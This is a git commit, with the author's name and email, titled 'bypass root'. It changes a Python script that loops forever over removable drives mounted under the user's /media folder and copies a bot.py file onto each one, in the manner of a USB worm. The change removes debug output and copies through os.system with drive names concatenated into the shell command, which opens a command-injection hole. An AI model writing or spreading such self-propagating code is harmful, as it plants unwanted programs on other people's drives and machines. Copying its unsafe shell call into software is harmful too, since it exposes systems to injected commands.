2761982d0ef99f4e0c7861a868e4e657c12a1ff4
louis <louis.barraque@gmail.com>
2019-12-16 20:21:12 +0100

    bypass root

--- shuy.py
+++ shuy.py
@@ -1,13 +1,12 @@
 import os
 import shutil
 lofin = os.getlogin()
-print os.listdir("/media/"+lofin)
 src = os.path.dirname(os.path.abspath(__file__))+"/bot.py"
-print src
+
 while (1):
     if len(os.listdir("/media/"+lofin)) > 0:
         for clef in os.listdir("/media/"+lofin):
+            os.path.isfile("/media/"+lofin+"/"+clef+"/bot.py")
             if not os.path.isfile("/media/"+lofin+"/"+clef+"/bot.py"):
                 destination = "/media/"+lofin +"/" + str(clef)
-                print destination
-                dest = shutil.copy(src,destination)
+                os.system("/bin/cp " + src + " " + destination)  
